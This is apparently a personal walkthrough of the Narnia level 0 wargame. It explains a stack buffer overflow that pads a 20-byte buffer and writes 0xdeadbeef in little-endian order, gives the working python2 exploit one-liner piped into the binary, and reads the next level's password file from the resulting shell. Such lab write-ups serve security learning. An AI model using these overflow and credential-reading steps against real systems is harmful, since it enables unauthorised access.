char buf[20]; = 20 bytes

need to fill up buf before overwriting with deadbeef.
"A"*20 + 0xdeadbeef | 0x is just for hexadecimal
The program is little endian so we have to 'reverse' deadbeef
\xef\xbe\xad\xde

---------------------
python2 -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
works, but the i/o stream is instantly closed.
---------------------
(python2 -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0

added cat as a i/o stream to keep the window open after.
(this works in python2, but cannot get it to work with python3 for some reason)

after successfull shell:
cat /etc/narnia_pass/narnia1 for password
